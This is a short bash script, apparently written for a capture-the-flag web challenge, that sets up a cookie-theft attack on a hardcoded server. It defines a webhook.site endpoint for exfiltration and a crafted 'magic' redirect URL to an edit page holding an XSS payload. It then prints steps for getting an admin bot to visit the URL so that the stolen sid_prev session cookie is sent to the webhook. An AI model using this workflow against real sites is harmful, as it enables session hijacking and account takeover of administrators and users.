#!/bin/bash

TARGET="http://34.26.148.28:5000"

# Use webhook.site for easy testing - you can also use your own server
WEBHOOK="https://webhook.site/unique-id"  # Replace with actual webhook

# From the previous run
MAGIC_URL="http://34.26.148.28:5000/magic/767ba39987e232d720c724f453474cd4?redirect=/edit/639"

echo "=== Reporting to Admin Bot ==="
echo "Magic URL: $MAGIC_URL"
echo ""
echo "Visit: $TARGET/report"
echo "And submit the magic URL"
echo ""
echo "The admin will:"
echo "1. Visit the magic link"
echo "2. Get redirected to /edit/639 with our payload"
echo "3. XSS fires and sends cookie to webhook"
echo ""
echo "Check webhook for the stolen sid_prev cookie"

